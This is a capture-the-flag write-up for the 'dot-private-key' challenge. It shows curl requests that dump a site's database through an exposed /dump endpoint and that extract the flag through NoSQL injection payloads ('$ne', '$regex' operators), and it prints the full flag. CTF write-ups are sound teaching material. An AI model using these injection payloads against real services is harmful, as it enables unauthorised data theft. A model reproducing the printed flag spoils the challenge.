# dot-private-key

![Proof](proof.png)   

**Author:** `RaduTek`  
**Solves:** 26

**writeup made by** `lifip27`
---

## Description

Our security researcher has found this dubious website claiming to check any private keys for potential breaches in a secure manner. They think otherwise.

Attached are some clean keys that our researcher tried to check with the website a few days ago. Curiously, they have been exposed since.

Your task is to see if this website is truly up to what it claims.

we get `keys.txt`

## Solve

### Unintended solve
I found a vulnerability in this challenge particular to /dump

```bash
$ curl http://ctf.ac.upt.ro:9239/dump
...
ctf{...}
```

This would just leak absolut everything even the flag.

### Intended solve is doing NoSQL in key query
```bash
$curl -s -X POST http://ctf.ac.upt.ro:9239/key \
  -H 'Content-Type: application/json' \
  -d '{"key":{"$ne":""},"type":"other"}' | jq .
{
  "breach": {
    "_id": "68c72076e2df5cb2097558fa",
    "type": "other",
    "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyAiaGVsbG8iIDozfQ==",
    "sources": [
      "https://impkb.xyz/?d=aHR0cHM6Ly9wYXN0ZWJpbi5jb20vY2luTTV5WFg="
    ],
    "addedAt": 1757059854
  }
}
```

Because we confirmed the NoSQL injection worked lets try to regex the flag using `{"key":{"$regex":"ctf{","$options":"i"},"type":{"$regex":".*"}}`
```bash
$ curl -i -s -X POST http://ctf.ac.upt.ro:9239/key   -H 'Content-Type: application/json'   -d '{"key":{"$regex":"ctf{","$options":"i"},"type":{"$regex":".*"}}'
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 172
ETag: W/"ac-C5xsM7Ij5D/pSpBFx7msMS+dd+M"
Date: Wed, 17 Sep 2025 18:26:21 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"breach":{"_id":"68c72076e2df5cb2097558fc","key":"ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}","type":"other","sources":[],"addedAt":1726344438}}
```
There is our flag!

### Flag: ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}